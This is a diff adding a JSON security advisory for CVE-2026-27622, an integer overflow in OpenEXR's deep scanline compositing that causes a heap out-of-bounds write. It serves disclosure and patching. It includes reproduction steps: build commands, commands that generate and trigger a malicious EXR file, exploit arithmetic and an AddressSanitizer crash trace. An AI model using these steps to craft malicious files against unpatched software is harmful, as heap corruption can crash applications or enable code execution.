@@ -1,0 +1,118 @@
+{
+  "id": "GHSA-cr4v-6jm6-4963",
+  "modified": "2026-03-04T15:13:59.582495Z",
+  "published": "2026-03-02T18:30:20Z",
+  "aliases": [
+    "CVE-2026-27622"
+  ],
+  "summary": "OpenEXR's CompositeDeepScanLine integer-overflow leads to heap OOB write",
+  "details": "## Summary\n\nFunction: `CompositeDeepScanLine::readPixels`, reachable from high-level multipart deep read flows (`MultiPartInputFile` + `DeepScanLineInputPart` + `CompositeDeepScanLine`).\n\nVulnerable lines (`src/lib/OpenEXR/ImfCompositeDeepScanLine.cpp`):\n- `total_sizes[ptr] += counts[j][ptr];` (line ~511)\n- `overall_sample_count += total_sizes[ptr];` (line ~514)\n- `samples[channel].resize (overall_sample_count);` (line ~535)\n\nImpact: 32-bit sample-count accumulation wrap leads to undersized allocation, then decode writes with true sample volume, causing heap OOB write in `generic_unpack_deep_pointers` (`src/lib/OpenEXRCore/unpack.c:1374`) (DoS/Crash, memory corruption/RCE).\n\nAttack scenario:\n- Attacker provides multipart deep EXR with many parts and very large sample counts per pixel.\n- Uses compression (RLE/ZIPS) to keep file size relatively small vs decode pressure.\n- The overflow happens in composite sample accounting (`unsigned int`), while pointer progression for decode uses larger counters and reaches out-of-bounds.\n\nTested on: `OpenEXR 4.0.0-dev` (commit 83449669402080874b25ff1fa740649a9e6ea064) but this code has existed since v2.3.0\n\n## Steps to reproduce\n\n[composite_deepscanline_poc_bundle.patch](https://github.com/user-attachments/files/25383205/composite_deepscanline_poc_bundle.patch)\n\nPoC files used:\n- Writer/generator: `poc/composite_deep_scanline_e2e_compressed_poc.cpp`\n- Minimal high-level reader harness: `poc/simple_exr_reader.cpp`\n\nThe reader harness intentionally mimics realistic app behavior: open EXR, iterate parts, select `DEEPSCANLINE`, add sources to `CompositeDeepScanLine`, bind a normal `FrameBuffer`, then call `readPixels`.\n\nBuild with ASAN/UBSAN:\n\n```bash\ncmake -S . -B build-asan \\\n  -DOPENEXR_BUILD_POC=ON \\\n  -DCMAKE_BUILD_TYPE=RelWithDebInfo \\\n  -DCMAKE_C_FLAGS='-fsanitize=address,undefined -fno-omit-frame-pointer' \\\n  -DCMAKE_CXX_FLAGS='-fsanitize=address,undefined -fno-omit-frame-pointer' \\\n  -DCMAKE_EXE_LINKER_FLAGS='-fsanitize=address,undefined' \\\n  -DCMAKE_SHARED_LINKER_FLAGS='-fsanitize=address,undefined'\n\ncmake --build build-asan --target composite_writer simple_exr_reader -j\n```\n\nGenerate malicious file (decode-path focused profile):\n\n```bash\nASAN_OPTIONS=detect_leaks=0 timeout 180s \\\n  ./build-asan/poc/composite_writer \\\n  --profile low-ram \\\n  --file /tmp/composite_decode_focus.exr\n```\n\nTrigger:\n\n```bash\nASAN_OPTIONS=detect_leaks=0 timeout 30s \\\n  ./build-asan/poc/simple_exr_reader /tmp/composite_decode_focus.exr\n```\n\nASAN builds are slower. If needed, a non-sanitized build + debugger is faster for iteration.\n\n## Example runs\n\nWriter (abbrev):\n\n```bash\n❯ ./build-asan/poc/composite_writer\nexploit math:\n  benign samples                 : 300\n  malicious parts                : 86\n  malicious samples per part     : 50000000\n  true total samples             : 4300000300\n  uint32 overflow reached        : yes\n  wrapped uint32 total           : 5033004\n  composite Z/A alloc from wrap  : 40264032 bytes (38.40 MiB)\n  per-part unpacked sample bytes : 300000000 bytes (286.10 MiB)\n  min parts to overflow (current benign/samples): 86\nwriting compressed multipart deep EXR: /tmp/composite_deep_scanline_e2e_compressed.exr\nwriting donor malicious part (50000000 samples)\ncopying malicious part 1/86 from donor chunk\n...\nfile size: 26112896 bytes (24.90 MiB)\n```\n\nReader ASAN crash:\n\n```bash\n❯ ./build-asan/poc/simple_exr_reader\nreading /tmp/composite_overflow_optimized.exr with 16 deepscanline parts\n=================================================================\n==175024==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7ed1a55d90b0 at pc 0x7ed1da7854f7 bp 0x7ffe8c83a680 sp 0x7ffe8c83a670\nWRITE of size 4 at 0x7ed1a55d90b0 thread T0\n    #0 0x7ed1da7854f6 in generic_unpack_deep_pointers /home/pop/sec/openexr/src/lib/OpenEXRCore/unpack.c:1374\n    #1 0x7ed1da7623e9 in exr_decoding_run /home/pop/sec/openexr/src/lib/OpenEXRCore/decoding.c:664\n    #2 0x7ed1dbcb153b in run_decode /home/pop/sec/openexr/src/lib/OpenEXR/ImfDeepScanLineInputFile.cpp:816\n    #3 0x7ed1dbcc597f in Imf_4_0::DeepScanLineInputFile::Data::readData(Imf_4_0::DeepFrameBuffer const\u0026, int, int, bool) /home/pop/sec/openexr/src/lib/OpenEXR/ImfDeepScanLineInputFile.cpp:568\n    #4 0x7ed1dbc01ca4 in Imf_4_0::CompositeDeepScanLine::readPixels(int, int) /home/pop/sec/openexr/src/lib/OpenEXR/ImfCompositeDeepScanLine.cpp:576\n    #5 0x64669005f233 in main /home/pop/sec/openexr/poc/simple_exr_reader.cpp:88\n    #6 0x7ed1d942a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58\n    #7 0x7ed1d942a28a in __libc_start_main_impl ../csu/libc-start.c:360\n    #8 0x6466900601e4 in _start (/home/pop/sec/openexr/build-asan/poc/simple_exr_reader+0x1b1e4) (BuildId: 86b018d0dce48def6ca06be031266f0205c914d2)\n\n0x7ed1a55d90b0 is located 0 bytes after 820132016-byte region [0x7ed1747b5800,0x7ed1a55d90b0)\nallocated by thread T0 here:\n    #0 0x7ed1dd0fe548 in operator new(unsigned long) ../../../../src/libsanitizer/asan/asan_new_delete.cpp:95\n    #1 0x7ed1dbc29600 in std::__new_allocator\u003cfloat\u003e::allocate(unsigned long, void const*) /usr/include/c++/13/bits/new_allocator.h:151\n    #2 0x7ed1dbc29600 in std::allocator_traits\u003cstd::allocator\u003cfloat\u003e \u003e::allocate(std::allocator\u003cfloat\u003e\u0026, unsigned long) /usr/include/c++/13/bits/alloc_traits.h:482\n    #3 0x7ed1dbc29600 in std::_Vector_base\u003cfloat, std::allocator\u003cfloat\u003e \u003e::_M_allocate(unsigned long) /usr/include/c++/13/bits/stl_vector.h:381\n    #4 0x7ed1dbc29600 in std::_Vector_base\u003cfloat, std::allocator\u003cfloat\u003e \u003e::_M_allocate(unsigned long) /usr/include/c++/13/bits/stl_vector.h:378\n    #5 0x7ed1dbc29600 in std::vector\u003cfloat, std::allocator\u003cfloat\u003e \u003e::_M_default_append(unsigned long) /usr/include/c++/13/bits/vector.tcc:663\n    #6 0x7ed1dbc00184 in std::vector\u003cfloat, std::allocator\u003cfloat\u003e \u003e::resize(unsigned long) /usr/include/c++/13/bits/stl_vector.h:1016\n    #7 0x7ed1dbc00184 in Imf_4_0::CompositeDeepScanLine::readPixels(int, int) /home/pop/sec/openexr/src/lib/OpenEXR/ImfCompositeDeepScanLine.cpp:535\n    #8 0x64669005f233 in main /home/pop/sec/openexr/poc/simple_exr_reader.cpp:88\n    #9 0x7ed1d942a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58\n    #10 0x7ed1d942a28a in __libc_start_main_impl ../csu/libc-start.c:360\n    #11 0x6466900601e4 in _start (/home/pop/sec/openexr/build-asan/poc/simple_exr_reader+0x1b1e4) (BuildId: 86b018d0dce48def6ca06be031266f0205c914d2)\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow /home/pop/sec/openexr/src/lib/OpenEXRCore/unpack.c:1374 in generic_unpack_deep_pointers\nShadow bytes around the buggy address:\n  0x7ed1a55d8e00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x7ed1a55d8e80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x7ed1a55d8f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x7ed1a55d8f80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x7ed1a55d9000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n=\u003e0x7ed1a55d9080: 00 00 00 00 00 00[fa]fa fa fa fa fa fa fa fa fa\n  0x7ed1a55d9100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x7ed1a55d9180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x7ed1a55d9200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x7ed1a55d9280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x7ed1a55d9300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07\n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==175024==ABORTING\n```\n\n## Root cause analysis\n\nIn `CompositeDeepScanLine::readPixels`:\n\n1. Per-pixel totals are accumulated in `vector\u003cunsigned int\u003e total_sizes`.\n2. For attacker-controlled large counts across many parts, `total_sizes[ptr]` wraps modulo `2^32`.\n3. `overall_sample_count` is then derived from wrapped totals and used in `samples[channel].resize(overall_sample_count)`.\n4. Decode pointer setup/consumption proceeds with true sample counts, and write operations in core unpack (`generic_unpack_deep_pointers`) overrun the undersized composite sample buffer.\n\n\nAllocation is based on a tiny wrapped value, but decode writes correspond to the true large sample volume.\n\n## Impact\n\nHeap OOB write during decode. This is at minimum a reliable crash/DoS. As heap corruption, this bug could be used for potential remote code execution.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "openexr",
+        "purl": "pkg:pypi/openexr"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "2.3.0"
+            },
+            {
+              "fixed": "3.2.6"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "3.2.3",
+        "3.2.4",
+        "3.2.5"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-cr4v-6jm6-4963/GHSA-cr4v-6jm6-4963.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "openexr",
+        "purl": "pkg:pypi/openexr"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.3.0"
+            },
+            {
+              "fixed": "3.3.8"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "3.3.0",
+        "3.3.1",
+        "3.3.2",
+        "3.3.3",
+        "3.3.4",
+        "3.3.5",
+        "3.3.6",
+        "3.3.7"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-cr4v-6jm6-4963/GHSA-cr4v-6jm6-4963.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "openexr",
+        "purl": "pkg:pypi/openexr"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.4.0"
+            },
+            {
+              "fixed": "3.4.6"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "3.4.0",
+        "3.4.1",
+        "3.4.2",
+        "3.4.3",
+        "3.4.4",
+        "3.4.5"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-cr4v-6jm6-4963/GHSA-cr4v-6jm6-4963.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-cr4v-6jm6-4963"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27622"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/AcademySoftwareFoundation/openexr"
+    }
+  ]
+}
